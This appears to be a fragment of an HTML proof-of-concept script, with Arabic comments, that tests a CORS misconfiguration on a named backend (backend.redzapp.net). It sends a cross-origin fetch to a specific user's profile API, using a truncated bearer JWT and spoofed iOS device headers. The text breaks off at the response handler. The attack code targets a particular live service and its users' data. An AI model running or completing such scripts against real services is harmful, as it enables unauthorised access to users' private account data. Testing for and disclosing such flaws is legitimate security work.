    <script>
        const targetUrl = "https://backend.redzapp.net/api/users/8242?with_follower_status=1&with_following_status=1&with_posts_count=1&with_profile_photo=1";
        
        // ملاحظة: في الهجوم الحقيقي، المتصفح لا يملك التوكن إلا لو سرقه المهاجم بطريقة أخرى
        // لكن لإثبات ضعف الإعدادات (CORS Misconfiguration) للموقع، نستخدم التوكن الخاص بك:
        const bearerToken = "Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJyQVJGOWFlelBLMnVRdDlIMzRkVUFYVzhQV0lMZU1ZZGgxTHFPUjh1MDdZIn0..."; // ضع التوكن كاملاً هنا

        fetch(targetUrl, {
            method: 'GET',
            headers: {
                'Authorization': bearerToken,
                'X-Device': 'B08DB94D-A940-5BC5-932F-405071BEF14D',
                'X-App-Version': '4.5.0',
                'X-Platform': 'ios'
            },
            mode: 'cors' // طلب مشاركة الموارد
        })
        .then(response => {
